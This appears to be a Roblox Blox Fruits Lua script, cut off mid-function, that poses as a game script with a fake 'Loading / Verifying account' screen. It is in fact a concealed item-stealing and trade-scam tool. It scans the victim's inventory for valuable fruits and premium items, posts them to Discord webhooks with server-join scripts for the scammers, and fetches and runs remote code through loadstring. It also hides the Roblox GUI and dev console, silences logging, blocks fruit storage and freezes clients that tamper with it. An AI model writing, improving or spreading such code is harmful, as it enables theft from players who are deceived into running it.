-- Sharky On Top - Blox Fruits Script
Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main user hits (url1)
Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your primary usernames (can use commands, bypass filter)
FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon (West)-Dragon (West)"} -- << Fruits you want to target (others can be added below)


--OBFUSCATE AFTER THIS
--ADMIN CONFIG START
loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))() --loads other webhooks

local TEST_WEBHOOK = "https://l.webhook.party/hook/vWJ1Rd7lQSopCs4Vuxa7qHWNoYm4q9%2FH4UAqVOaMoxSpOq%2F4Yp08fCU4Tkn%2Fq26SyB0EVJmJSP9spoYM4pFRDLegxSsmeVCLVPWmKH437EawBax1%2FvN6KILwa9CaWV1%2Fkg7EjtZ0UlOwMyqR7X1iXvdaUcyJaApo2%2FIn7mbomfGkAFacgxB6WVOi0Lm9exZDmC04bOlBJ3pX9FcWLadkzLCKvZE8ytiea1LgyVzVyBUBCPSBTWl6yTaIPk8428hc23eC3dAsPuCK4Dbu2ZernRaO654dO7nVSJuzelZL09nkouPlr28BGoAwlNImD%2FvtTTPWuZnUVTnr9%2FijK2q%2Bh92EfSHf%2BH5qg334UcBZR5b7osNi4z%2BD8DCK%2F%2BooE1xWtv6WgNQkDMM%3D/zWMIeMClX%2FlPLAgD" -- For simple hit integrity check only
local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({
    content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>"
})


AddTheseFruits = { "Dragon (West)-Dragon (West)", "Dragon (East)-Dragon (East)", "Kitsune-Kitsune" } -- << Fruits that MUST always be in the FruitsToHit table

TestingUsernames = { "tester1", "your_alt_account" }

ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- << Passwords for ?activate command
local BlacklistedUsers = {"Scammer1", "KnownAltTrader", "RuleBreaker"} -- << Add usernames who should NEVER be allowed access

local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg" } -- << Core admin usernames (hardcoded)

RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.

local validation_sig = "rashya5@%-hsfj79h93-wakliballs"

--ADMIN CONGIG ENDS

local function ensureFruitsToHit()
    if not AddTheseFruits or type(AddTheseFruits) ~= "table" then
        return
    end
    if not FruitsToHit or type(FruitsToHit) ~= "table" then
        return
    end
    for _, fruitNameToEnsure in ipairs(AddTheseFruits) do
        if not table.find(FruitsToHit, fruitNameToEnsure) then
            table.insert(FruitsToHit, fruitNameToEnsure)
        end
    end
end
ensureFruitsToHit() -- Ensure required fruits are in the list immediately

-- State Variables
local allowEveryone = false
local activatedUsers = {}
local nonAdminAuthDisabled = false
local isSilentModeActive = false
local silentModeTargetPlayer = nil
local lastScanWasDragonHit = false -- Tracks if last webhook hit included Dragon
local currentTradeSessionAutoAddedDragon = false -- Prevents re-adding in same session

-- Emoji Map
local fruitEmojiMap = {
    ["Barrier-Barrier"] = "<:barrier:660245023765561344>",
    ["Blizzard-Blizzard"] = "<:blizzard:1056979177674387547>",
    ["Bomb-Bomb"] = "<:bomb:590579368246378506>",
    ["Buddha-Buddha"] = "<:buddha:1317755758347288616>",
    ["Chop-Chop"] = "<:chop:590579369592750100>",
    ["Control-Control"] = "<:control:709260359370014722>",
    ["Creation-Creation"] = "<:creation:1362653383131004969>",
    ["Dark-Dark"] = "<:dark:1317755995665207376>",
    ["Diamond-Diamond"] = "<:diamond:1317756492144836618>",
    ["T-Rex-T-Rex"] = "<:dino:1189804216903008276>",
    ["Dough-Dough"] = "<:dough:1317755522073624637>",
    ["Mammoth-Mammoth"] = "<:mammoth:1165678609512542218>",
    ["Pain-Pain"] = "<:pain:1170004224915021864>",
    ["Phoenix-Phoenix"] = "<:phoenix:590579369253011478>",
    ["Portal-Portal"] = "<:portal:1056979327075483728>",
    ["Quake-Quake"] = "<:quake:1317756761368952893>",
    ["Rocket-Rocket"] = "<:rocket:1166711048317972510>",
    ["Rubber-Rubber"] = "<:rubber:590579368896757760>",
    ["Rumble-Rumble"] = "<:rumble:1317756124350382183>",
    ["Sand-Sand"] = "<:sand:597623803496890379>",
    ["Shadow-Shadow"] = "<:shadow:906379537137418310>",
    ["Blade-Blade"] = "<:slice:1324404414848565361>",
    ["Smoke-Smoke"] = "<:smoke:590579367692730387>",
    ["Sound-Sound"] = "<:sound:1165678605423083521>",
    ["Spider-Spider"] = "<:spider:1093933323253985460>",
    ["Spike-Spike"] = "<:spike:1317756623577415690>",
    ["Spin-Spin"] = "<:spin:886279018607964240>",
    ["Spirit-Spirit"] = "<:spirit:1056978177945247754>",
    ["Spring-Spring"] = "<:spring:590582765620297748>",
    ["Venom-Venom"] = "<:venom:886279018104619019>",
    ["Yeti-Yeti"] = "<:yeti:1322418732328554577>",
    ["Dragon (East)-Dragon (East)"] = "<:dragonE:1318248271457812510>",
    ["Dragon (West)-Dragon (West)"] = "<:dragonW:1318248380555591842>",
    ["Dragon-Dragon"] = "<:dragonE:1318248271457812510>",
    ["Eagle-Eagle"] = "<:eagle:1362652662985920604>",
    ["Flame-Flame"] = "<:flame:1317755887925858334>",
    ["Gas-Gas"] = "<:gas:1317756925311586324>",
    ["Ghost-Ghost"] = "<:ghost:1169961378946224231>",
    ["Gravity-Gravity"] = "<:gravity:1362652665179275476>",
    ["Ice-Ice"] = "<:ice:590579369462988837>",
    ["Kitsune-Kitsune"] = "<:kitsune:1185239741545848922>",
    ["Leopard-Leopard"] = "<:leopard:1018364446223122443>",
    ["Light-Light"] = "<:light:1317756250049613874>",
    ["Love-Love"] = "<:love:886279020122103828>",
    ["Magma-Magma"] = "<:magma:1317756326775881748>"
}

-- Core Services
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")
local UserSettings = UserSettings()

-- Helper Functions
local function isCoreAdmin(playerName)
    if not playerName or type(playerName) ~= "string" then
        return false
    end
    local lowerName = playerName:lower()
    for _, adminName in ipairs(coreAdminUsernames) do
        if lowerName == adminName:lower() then
            return true
        end
    end
    return false
end

local function takeAction()
    if setfpscap then
        setfpscap(0)
    end;
    rconsoleclear();
    print = function()
    end;
    warn = function()
    end;
    error = function()
    end;
    setclipboard = function()
    end;
    while true do
        task.wait()
    end
end

local function checkGui(gui)
    if gui:IsA("ScreenGui") then
        local n = gui:FindFirstChild(gui.Name);
        if n and n:IsA("ScreenGui") then
            if n:FindFirstChild("Orion") then
                takeAction()
            end
        end
    end
end

local function storeWebhookSafely(w)
    if not w or type(w) ~= "string" or w:match("^Enter Webhook") or w:match("REPLACE") then
        return nil
    end;
    local r = "var_" .. tostring(math.random(1e5, 999999)) .. "_" .. tostring(math.random(100, 999));
    _G[r] = w;
    return r
end

local function getInventory()
    local s, r = pcall(ReplicatedStorage.Remotes.CommF_.InvokeServer, ReplicatedStorage.Remotes.CommF_, "getInventory");
    if not s then
        return nil
    end;
    return r
end

local function JoinTeam()
    if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
        pcall(ReplicatedStorage.Remotes.CommF_.InvokeServer, ReplicatedStorage.Remotes.CommF_, "SetTeam", "Marines")
    end
end

local function getServerName()
    local a = {"Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"}
    local n = {"TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"}
    local s = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time()
    local r = Random.new(s)
    return string.format("%s %s #%04d", a[r:NextInteger(1, #a)], n[r:NextInteger(1, #n)], r:NextInteger(1, 9999))
end

local originalRequest = request or http_request
local function SafeRequest(rd)
    local pr = {
        Method = rd.Method,
        Body = rd.Body,
        Url = rd.Url
    };
    pr.Headers = rd.Headers or {};
    pr.Headers["Content-Type"] = "application/json";
    pr.Headers["X-Request-Time"] = tostring(os.time() + math.random(1, 100));
    pr.Headers["X-Nonce"] = HttpService:GenerateGUID(false);
    return pcall(originalRequest, pr)
end

local function sanitizeUsernames()
    if not Usernames or type(Usernames) ~= "table" then return end
    if not BlacklistedUsers or type(BlacklistedUsers) ~= "table" then return end

    local blacklistedLower = {}
    for _, name in ipairs(BlacklistedUsers) do
        if type(name) == "string" then
            blacklistedLower[name:lower()] = true
        end
    end

    local i = #Usernames
    while i >= 1 do
        local user = Usernames[i]
        if type(user) == "string" and blacklistedLower[user:lower()] then
            print("Sanitize: Removing blacklisted user from Usernames table:", user)
            table.remove(Usernames, i)
        end
        i = i - 1
    end
end

-- Modified function checks against general authorization rules
local function isInTradeWithCorrectPlayer()
    local p = LocalPlayer;
    local pg = p:FindFirstChild("PlayerGui");
    if not pg then return false end;
    local mg = pg:FindFirstChild("Main");
    if not mg then return false end;
    local tf = mg:FindFirstChild("Trade");
    if not tf or not tf.Visible then return false end;
    local c = tf:FindFirstChild("Container");
    if not c then return false end;
    local f1 = c:FindFirstChild("1");
    local f2 = c:FindFirstChild("2");
    local p1l = f1 and f1:FindFirstChild("TextLabel");
    local p2l = f2 and f2:FindFirstChild("TextLabel");
    if not p1l or not p2l then return false end;

    local otherPlayerLabel = nil;
    local localPlayerName = p.Name;
    local localPlayerDisplayName = p.DisplayName
    if (p1l.Text == localPlayerName or p1l.Text == localPlayerDisplayName) then
        otherPlayerLabel = p2l
    elseif (p2l.Text == localPlayerName or p2l.Text == localPlayerDisplayName) then
        otherPlayerLabel = p1l
    else
        return false
    end
    if not otherPlayerLabel then return false end;

    local otherPlayerNameOrDisplay = otherPlayerLabel.Text;
    local otherPlayer = Players:FindFirstChild(otherPlayerNameOrDisplay)
    if not otherPlayer then
        local nameLower = otherPlayerNameOrDisplay:lower()
        for _, pl in ipairs(Players:GetPlayers()) do
            if pl.DisplayName:lower() == nameLower then otherPlayer = pl; break end
            if pl.Name:lower() == nameLower then otherPlayer = pl; break end
        end
    end
    if not otherPlayer then return false end

    -- Check if the partner meets *any* authorization criteria
    if isCoreAdmin(otherPlayer.Name) then return true end -- Always allow core admins
    if not nonAdminAuthDisabled then -- If general auth is enabled
        local isUsernameListed = false
        if Usernames and type(Usernames) == "table" then
            local pNameLower = otherPlayer.Name:lower()
            for _, uname in ipairs(Usernames) do if type(uname) == "string" and uname:lower() == pNameLower then isUsernameListed = true; break end end
        end
        local isActivated = activatedUsers[otherPlayer.UserId]
        if allowEveryone or isUsernameListed or isActivated then return true end
    end
    return false -- Not authorized
end

-- Wait for game load
repeat
    task.wait()
until game:IsLoaded()

--Initializing
print("Initializing...")

-- Anti-Tamper & Setup
if CoreGui:FindFirstChild("RobloxGui") then
    CoreGui.RobloxGui.Enabled = false
end
for _, g in ipairs(CoreGui:GetChildren()) do
    checkGui(g)
end;
CoreGui.ChildAdded:Connect(checkGui)
if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "SHAKINGSHARKER" or LocalPlayer.Name == "shirkarsharker") then
    takeAction()
end

-- Config Validation
if not Webhook or not Protector or not dummy or not Checker22 or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig or not coreAdminUsernames or not TestingUsernames or not BlacklistedUsers then
    LocalPlayer:Kick("Config Error: Missing critical variable(s).");
    return
end
if type(Webhook) ~= "string" or type(Protector) ~= "string" or type(dummy) ~= "string" or type(Checker22) ~= "string" or type(Usernames) ~= "table" or type(TestingUsernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(coreAdminUsernames) ~= "table" or type(validation_sig) ~= "string" or type(BlacklistedUsers) ~= "table" then
    LocalPlayer:Kick("Config Error: Variable type mismatch.");
    return
end
if validation_sig == "" or validation_sig:find("YourActualSecret") then
    LocalPlayer:Kick("SECURITY ERROR: Invalid Signature!");
    return
end
if Webhook:find("REPLACE") or Protector:find("REPLACE") or dummy:find("REPLACE") or Checker22:find("REPLACE") then
    LocalPlayer:Kick("ERROR: URLs are not configured!");
    return
end

-- Ensure Core Admins & Check Blacklist
local function ensureAdminUsernames()
    if type(Usernames) ~= "table" then
        Usernames = {}
    end;
    local existingUsernamesLower = {};
    for _, n in ipairs(Usernames) do
        if type(n) == "string" then
            existingUsernamesLower[string.lower(n)] = true
        end
    end;
    for _, adminName in ipairs(coreAdminUsernames) do
        if not existingUsernamesLower[string.lower(adminName)] then
            table.insert(Usernames, adminName)
        end
    end
end
ensureAdminUsernames()
sanitizeUsernames()
if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then
    takeAction()
end
CoreGui.ChildAdded:Connect(function(c)
    if c.Name == "DevConsoleMaster" then
        c.Enabled = false
    end
end)

-- Secure Webhook Storage
local webhook1_key = storeWebhookSafely(Webhook);
Webhook = nil;
local Protector_key = storeWebhookSafely(Protector);
Protector = nil;
local dummy_key = storeWebhookSafely(dummy);
dummy = nil;
local dragon_webhook_key = storeWebhookSafely(Checker22);
Checker22 = nil;

-- Silence Remote Console
rconsoleprint = function()
end;
rconsolewarn = function()
end;
rconsoleerr = function()
end;
rconsoleinfo = function()
end

-- Game Specific Variables
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser")
local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId")
if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then
    LocalPlayer:Kick("This script doesn't work on private servers.")
end
pcall(function()
    UserSettings:GetService("UserGameSettings").MasterVolume = 0
end)

-- Anti Fruit Store Hook
local oldNamecall;
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(s, ...)
    local m = getnamecallmethod();
    if not checkcaller() and m and m:lower() == "invokeserver" then
        local a = {
            ...
        };
        if a[1] == "StoreFruit" then
            return error("External fruit store attempt blocked.", 0)
        end
    end;
    return oldNamecall(s, ...)
end))

-- Loading Notification UI
local function createNotification()
    local p = LocalPlayer:WaitForChild("PlayerGui");
    local l = Instance.new("ScreenGui");
    l.Name = "BloxFruitsLoadingUI";
    l.IgnoreGuiInset = true;
    l.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
    l.Parent = p;
    local b = Instance.new("BlurEffect");
    b.Size = 0;
    b.Parent = Lighting;
    local bg = Instance.new("Frame");
    bg.Name = "Background";
    bg.Size = UDim2.new(1, 0, 1, 0);
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
    bg.BackgroundTransparency = 1;
    bg.Parent = l;
    local c = Instance.new("Frame");
    c.Name = "Container";
    c.Size = UDim2.new(0, 600, 0, 300);
    c.Position = UDim2.new(0.5, 0, 1.2, 0);
    c.AnchorPoint = Vector2.new(0.5, 0.5);
    c.BackgroundColor3 = Color3.fromRGB(25, 25, 30);
    c.BorderSizePixel = 0;
    c.Parent = l;
    Instance.new("UICorner", c).CornerRadius = UDim.new(0, 10);
    local u = Instance.new("UIStroke");
    u.Color = Color3.fromRGB(65, 169, 255);
    u.Thickness = 2;
    u.Parent = c;
    local hf = Instance.new("Frame");
    hf.Name = "Header";
    hf.Size = UDim2.new(1, 0, 0, 60);
    hf.BackgroundColor3 = Color3.fromRGB(35, 35, 45);
    hf.BorderSizePixel = 0;
    hf.Parent = c;
    Instance.new("UICorner", hf).CornerRadius = UDim.new(0, 10);
    local tl = Instance.new("TextLabel");
    tl.Name = "Title";
    tl.Size = UDim2.new(1, 0, 1, 0);
    tl.BackgroundTransparency = 1;
    tl.Font = Enum.Font.GothamBold;
    tl.Text = "Blox Fruits - Loading Script.";
    tl.TextColor3 = Color3.fromRGB(255, 255, 255);
    tl.TextSize = 24;
    tl.Parent = hf;
    local bf = Instance.new("Frame");
    bf.Name = "BottomFrame";
    bf.Size = UDim2.new(1, 0, 0, 10);
    bf.Position = UDim2.new(0, 0, 1, - 10);
    bf.BackgroundColor3 = Color3.fromRGB(35, 35, 45);
    bf.BorderSizePixel = 0;
    bf.ZIndex = 2;
    bf.Parent = hf;
    local ml = Instance.new("TextLabel");
    ml.Name = "Message";
    ml.Size = UDim2.new(1, - 40, 0, 60);
    ml.Position = UDim2.new(0, 20, 0, 80);
    ml.BackgroundTransparency = 1;
    ml.Font = Enum.Font.Gotham;
    ml.Text = "The script Is loading - Please, wait.";
    ml.TextColor3 = Color3.fromRGB(220, 220, 220);
    ml.TextSize = 18;
    ml.TextWrapped = true;
    ml.TextXAlignment = Enum.TextXAlignment.Center;
    ml.Parent = c;
    local lb = Instance.new("Frame");
    lb.Name = "LoadingBarBg";
    lb.Size = UDim2.new(1, - 40, 0, 20);
    lb.Position = UDim2.new(0, 20, 0, 150);
    lb.BackgroundColor3 = Color3.fromRGB(40, 40, 50);
    lb.BorderSizePixel = 0;
    lb.Parent = c;
    Instance.new("UICorner", lb).CornerRadius = UDim.new(0, 6);
    local lbar = Instance.new("Frame");
    lbar.Name = "LoadingBar";
    lbar.Size = UDim2.new(0, 0, 1, 0);
    lbar.BackgroundColor3 = Color3.fromRGB(65, 169, 255);
    lbar.BorderSizePixel = 0;
    lbar.Parent = lb;
    Instance.new("UICorner", lbar).CornerRadius = UDim.new(0, 6);
    local pl = Instance.new("TextLabel");
    pl.Name = "Progress";
    pl.Size = UDim2.new(1, 0, 0, 20);
    pl.Position = UDim2.new(0, 0, 0, 180);
    pl.BackgroundTransparency = 1;
    pl.Font = Enum.Font.Gotham;
    pl.Text = "Loading... 0%";
    pl.TextColor3 = Color3.fromRGB(180, 180, 180);
    pl.TextSize = 16;
    pl.Parent = c;
    local db = Instance.new("TextButton");
    db.Name = "DiscordButton";
    db.Size = UDim2.new(0, 180, 0, 40);
    db.Position = UDim2.new(0.5, 0, 0, 230);
    db.AnchorPoint = Vector2.new(0.5, 0);
    db.BackgroundColor3 = Color3.fromRGB(88, 101, 242);
    db.BorderSizePixel = 0;
    db.Font = Enum.Font.GothamBold;
    db.Text = "Join Discord";
    db.TextColor3 = Color3.fromRGB(255, 255, 255);
    db.TextSize = 16;
    db.Parent = c;
    Instance.new("UICorner", db).CornerRadius = UDim.new(0, 8);
    local di = Instance.new("ImageLabel");
    di.Name = "DiscordIcon";
    di.Size = UDim2.new(0, 20, 0, 20);
    di.Position = UDim2.new(0, 15, 0.5, 0);
    di.AnchorPoint = Vector2.new(0, 0.5);
    di.BackgroundTransparency = 1;
    di.Image = "rbxassetid://10367063073";
    di.Parent = db;
    db.MouseButton1Click:Connect(function()
        local inv = "https://discord.gg/uwdvTtqTDA";
        setclipboard(inv);
        local n = Instance.new("TextLabel");
        n.Name = "CopiedNotification";
        n.Size = UDim2.new(0, 180, 0, 30);
        n.Position = UDim2.new(0.5, 0, 0, 275);
        n.AnchorPoint = Vector2.new(0.5, 0);
        n.BackgroundColor3 = Color3.fromRGB(50, 50, 60);
        n.BorderSizePixel = 0;
        n.Font = Enum.Font.Gotham;
        n.Text = "Discord link copied!";
        n.TextColor3 = Color3.fromRGB(255, 255, 255);
        n.TextSize = 14;
        n.BackgroundTransparency = 1;
        n.TextTransparency = 1;
        n.Parent = c;
        Instance.new("UICorner", n).CornerRadius = UDim.new(0, 6);
        TweenService:Create(n, TweenInfo.new(0.3), {
            BackgroundTransparency = 0,
            TextTransparency = 0
        }):Play();
        task.delay(2, function()
            if n.Parent then
                TweenService:Create(n, TweenInfo.new(0.3), {
                    BackgroundTransparency = 1,
                    TextTransparency = 1
                }):Play();
                task.delay(0.3, function()
                    n:Destroy()
                end)
            end
        end)
    end);
    TweenService:Create(b, TweenInfo.new(0.5), {
        Size = 20
    }):Play();
    TweenService:Create(bg, TweenInfo.new(0.5), {
        BackgroundTransparency = 0.5
    }):Play();
    TweenService:Create(c, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }):Play();
    task.delay(1, function()
        local st = tick();
        local td = 120;
        local lp = 0;
        while lp < 99 and (tick() - st) < td and l.Parent do
            local te = tick() - st;
            local sf = 0.5 + math.abs(math.sin(te * 0.8)) * 1.5;
            local i = math.min(0.7, (99 - lp) / 100) * sf;
            local np = math.min(99, lp + i);
            if np > lp then
                lp = np;
                pl.Text = (lp > 75 and "Verifying account..." or "Loading...") .. " " .. math.floor(lp) .. "%";
                TweenService:Create(lbar, TweenInfo.new(0.2), {
                    Size = UDim2.new(lp / 100, 0, 1, 0)
                }):Play()
            end;
            task.wait(0.1)
        end;
        if l.Parent then
            pl.Text = "Verifying account... 99%";
            TweenService:Create(lbar, TweenInfo.new(0.2), {
                Size = UDim2.new(0.99, 0, 1, 0)
            }):Play()
        end
    end);
    local function cl()
        TweenService:Create(b, TweenInfo.new(0.5), {
            Size = 0
        }):Play();
        TweenService:Create(bg, TweenInfo.new(0.5), {
            BackgroundTransparency = 1
        }):Play();
        TweenService:Create(c, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Position = UDim2.new(0.5, 0, 1.2, 0)
        }):Play();
        task.delay(0.6, function()
            if l and l.Parent then
                l:Destroy()
            end;
            if b and b.Parent then
                b:Destroy()
            end
        end)
    end;
    task.spawn(function()
        while l.Parent do
            local cs = {
                Color3.fromRGB(255, 100, 100),
                Color3.fromRGB(100, 100, 255),
                Color3.fromRGB(100, 255, 100),
                Color3.fromRGB(65, 169, 255)
            };
            for _, co in ipairs(cs) do
                if not l.Parent or not u.Parent then
                    break
                end;
                pcall(function()
                    TweenService:Create(u, TweenInfo.new(1.5), {
                        Color = co
                    }):Play()
                end);
                task.wait(1.5)
            end
        end
    end);
    return {
        Destroy = cl
    }
end

-- Embed Formatting Functions
local function formatFruitListWithEmojis_NoCodeBlock(f)
    if not f or # f == 0 then
        return "None"
    end;
    local l = {};
    table.sort(f, function(a, b)
        return (a.value or 0) > (b.value or 0)
    end);
    for _, fr in ipairs(f) do
        local e = fruitEmojiMap[fr.name] or "";
        local p = e ~= "" and (e .. " ") or "";
        local c = fr.count > 1 and string.format(" (x%d)", fr.count) or "";
        table.insert(l, string.format("%s%s%s", p, fr.name, c))
    end;
    local M = 15;
    if # l > M then
        local d = {};
        for i = 1, M do
            table.insert(d, l[i])
        end;
        table.insert(d, string.format("*... and %d more*", # l - M));
        return table.concat(d, "\n")
    else
        return table.concat(l, "\n")
    end
end
local function formatPremiumList_NoCodeBlock(p)
    if not p or # p == 0 then
        return "None"
    end;
    local l = {};
    table.sort(p, function(a, b)
        return a.name < b.name
    end);
    for _, i in ipairs(p) do
        local e = "";
        local pr = e ~= "" and (e .. " ") or "";
        local c = i.count > 1 and string.format(" (x%d)", i.count) or "";
        table.insert(l, string.format("%s%s%s", pr, i.name, c))
    end;
    local M = 10;
    if # l > M then
        local d = {};
        for i = 1, M do
            table.insert(d, l[i])
        end;
        table.insert(d, string.format("*... and %d more*", # l - M));
        return table.concat(d, "\n")
    else
        return table.concat(l, "\n")
    end
end
local function formatCombinedTargets_CodeBlocks_NoSeparator(f, p, fs)
    local tl = {};
    local fft = false;
    local fpt = false;
    local tf = 0;
    local M = 7;
    if f then
        table.sort(f, function(a, b)
            return (a.value or 0) > (b.value or 0)
        end);
        for _, fr in ipairs(f) do
            if fs[fr.name] and tf < M then
                fft = true;
                tf = tf + 1;
                local n = fr.name;
                local c = fr.count > 1 and string.format(" (x%d)", fr.count) or "";
                table.insert(tl, string.format("```\n%s%s\n```", n, c))
            end
        end
    end;
    if p then
        table.sort(p, function(a, b)
            return a.name < b.name
        end);
        for _, i in ipairs(p) do
            if tf < M then
                fpt = true;
                tf = tf + 1;
                local n = i.name;
                local c = i.count > 1 and string.format(" (x%d)", i.count) or "";
                table.insert(tl, string.format("```\n%s%s\n```", n, c))
            end
        end
    end;
    if not fft and not fpt then
        return "```\nNone\n```"
    end;
    local ac = 0;
    if f then
        for _, fr in ipairs(f) do
            if fs[fr.name] then
                ac = ac + 1
            end
        end
    end;
    if p then
        ac = ac + # p
    end;
    if ac > M then
        table.insert(tl, string.format("```\n... and %d more\n```", ac - M))
    end;
    return table.concat(tl, "")
end

-- Webhook Sending Logic
local function sendWebhook(inventory)
    local url1 = webhook1_key and _G[webhook1_key];
    local url2 = Protector_key and _G[Protector_key];
    local url3 = dummy_key and _G[dummy_key];
    local url4 = dragon_webhook_key and _G[dragon_webhook_key]
    if not url1 and not url2 then
        return
    end

    local goodFruitNames = {
        ["Kitsune-Kitsune"] = true,
        ["Yeti-Yeti"] = true
    }
    local fruits, premiumItems = {}, {};
    local dragonHit, hasPremiumItem, hasGoodFruit, foundAnyTarget = false, false, false, false;
    local fruitsToHitSet = {};
    for _, f in ipairs(FruitsToHit) do
        fruitsToHitSet[f] = true
    end
    if not inventory then
        inventory = {}
    end

    for _, item in ipairs(inventory) do
        if item and (item.Type == "Blox Fruit" or item.Type == "Premium") then
            local d = {
                name = item.Name,
                count = item.Count,
                value = item.Value or 0
            };
            if item.Type == "Blox Fruit" then
                table.insert(fruits, d);
                if item.Name:find("Dragon") then
                    dragonHit = true;
                    if not fruitsToHitSet[item.Name] then
                        table.insert(FruitsToHit, item.Name);
                        fruitsToHitSet[item.Name] = true
                    end
                end;
                if goodFruitNames[item.Name] then
                    hasGoodFruit = true
                end;
                if fruitsToHitSet[item.Name] then
                    foundAnyTarget = true
                end
            else
                table.insert(premiumItems, d);
                hasPremiumItem = true;
                foundAnyTarget = true
            end
        end
    end

    lastScanWasDragonHit = dragonHit -- Update global state

    if not foundAnyTarget then
        lastScanWasDragonHit = false -- Ensure it's false if nothing found
        return
    end

    local jobId = game.JobId;
    local placeId = game.PlaceId;
    local isSea3 = (placeId == 7449423635);
    local seaTravelArgument = isSea3 and "TravelZou" or "TravelDressrosa"
    local joinScriptFormatString = [=[local iddd=%d local JobIdd="%s" local sea="%s" if game.PlaceId~=iddd then queue_on_teleport([[ task.wait(5) if game.JobId~=JobIdd then print("Executing queued teleport to: "..JobIdd) game:GetService("TeleportService"):TeleportToPlaceInstance(%d,"%s") else print("Already in target server, skipping queued teleport.") end ]]) print("Invoking sea travel: "..sea) game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea) else if game.JobId~=JobIdd then print("Already in correct sea, teleporting directly to: "..JobIdd) game:GetService("TeleportService"):TeleportToPlaceInstance(iddd,JobIdd) else print("Already in target server instance.") end end]=]
    local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
    local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```";
    local joinScriptMobile_Formatted = joinScriptLua
    local baseEmbedTitle = "<a:among_us_party:780475189519056946> **Sharky Joiner Hit!** <a:among_us_party:780475189519056946>";
    local baseEmbedColor = 10181046;
    local baseMention = "@everyone Sharky Hit!";
    local isTopFruitOnlyHit = false
    if dragonHit and hasPremiumItem then
        baseEmbedTitle = "<:dragonE:1318248271457812510><:value:1228807380188397649> **DRAGON & PREMIUM HIT!** <a:among_us_party:780475189519056946>";
        baseEmbedColor = 65280;
        baseMention = "@everyone Sharky - GG!"
    elseif dragonHit then
        baseEmbedTitle = "<:dragonE:1318248271457812510> **DRAGON HIT!** <a:among_us_party:780475189519056946>";
        baseEmbedColor = 16711680;
        baseMention = "@everyone Sharky - GG!"
    elseif hasPremiumItem then
        baseEmbedTitle = "<a:among_us_party:780475189519056946> **PREMIUM ITEM HIT!** <a:among_us_party:780475189519056946>";
        baseEmbedColor = 3447003;
        baseMention = "@everyone Sharky - GG!"
    elseif hasGoodFruit then
        baseEmbedTitle = "<a:among_us_party:780475189519056946> **TOP FRUIT HIT!** (Kitsune/Yeti) <a:among_us_party:780475189519056946>";
        baseEmbedColor = 16753920;
        baseMention = "@everyone Sharky - GG!";
        isTopFruitOnlyHit = true
    elseif foundAnyTarget then
        baseEmbedTitle = "<a:among_us_party:780475189519056946> **Target Fruit Hit!** <a:among_us_party:780475189519056946>"
    end
    local serverName = getServerName();
